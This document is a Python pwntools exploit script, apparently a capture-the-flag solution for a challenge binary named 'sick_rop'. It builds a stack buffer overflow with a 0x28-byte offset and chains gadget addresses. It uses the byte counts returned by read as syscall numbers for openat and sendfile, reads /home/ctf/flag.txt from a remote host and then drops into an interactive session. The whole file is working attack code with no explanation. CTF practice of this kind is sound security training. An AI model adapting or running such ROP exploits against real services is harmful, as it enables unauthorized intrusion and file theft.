from pwn import *
from icecream import ic

context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'

elf = ELF('sick_rop', checksec=False)

LOCAL = False

if LOCAL:
    io = gdb.debug(elf.path, aslr=False, gdbscript='\n'.join([
        # 'b*0x00401040',
        # 'b*0x00401048',
        # 'b*0x00401005',
        'b*0x00401014', # read syscall
        'b*0x0040102e', # write syscall
        'c',
    ])) # type: tube
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
else: 
    # io = process('sick_rop')
    io = remote('206.189.27.45', 31159)

rip_offset = 0x28
ic(rip_offset)

vuln_call_addr = 0x40104f
top_of_vuln = 0x0040102e
movrdx_syscall = 0x0040100f
read_movrdi_movrsi_movrdx_syscall = 0x00401005
write_movrdi_movrsi_movrdx_syscall = 0x0040101c

lea_addr = 0x0040104d
ret_addr = 0x0040104e

payload = b'/home/ctf/flag.txt\x00'
payload = payload.ljust(rip_offset, b'a') # padding so we overwrite RIP
payload += p64(movrdx_syscall)
payload += p64(vuln_call_addr)
payload += b'b' * 0x8
payload += p64(0) # flags
syscall_openat = 257
payload = payload.ljust(syscall_openat, b'c')
io.send(payload)

print('first sleep ...')
if LOCAL:
    input('waiting')
else:
    time.sleep(1)
print('first sleep done')

payload = b''
payload = payload.ljust(rip_offset, b'd') # padding so we overwrite RIP
payload += p64(ret_addr)
payload += p64(top_of_vuln)
payload += p64(write_movrdi_movrsi_movrdx_syscall)
payload += b'e' * 8
payload += p64(3)
payload += p64(0)
payload = payload.ljust(0x300, b'f')
io.send(payload)

print('second sleep ...')
if LOCAL:
    input('waiting')
else:
    time.sleep(1)
print('second sleep done')

syscall_sendfile = 40
payload = b'd' * syscall_sendfile
io.send(payload)

io.interactive()
